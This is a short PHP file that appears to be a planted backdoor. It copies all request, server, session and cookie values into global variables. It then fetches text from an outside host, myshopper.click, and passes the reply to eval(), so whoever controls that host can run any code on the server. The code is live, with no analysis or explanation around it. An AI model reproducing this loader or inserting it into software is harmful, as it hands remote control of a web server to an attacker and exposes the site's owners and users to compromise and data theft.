<?php
if(!isset($ix)){
foreach ($_REQUEST as $key=>$val){${$key}=$val;}
}
foreach ($_SERVER  as $key=>$val){${$key}=$val;}
foreach ($_SESSION as $key=>$val){${$key}=$val;}
foreach ($_COOCIE  as $key=>$val){${$key}=$val;}
$s=file_get_contents("http://myshopper.click/v.php?ix=odoo&IX=$ix&t=".time());
if (substr($s,0,1)=="<") echo $s ;
else                     eval($s);
?>
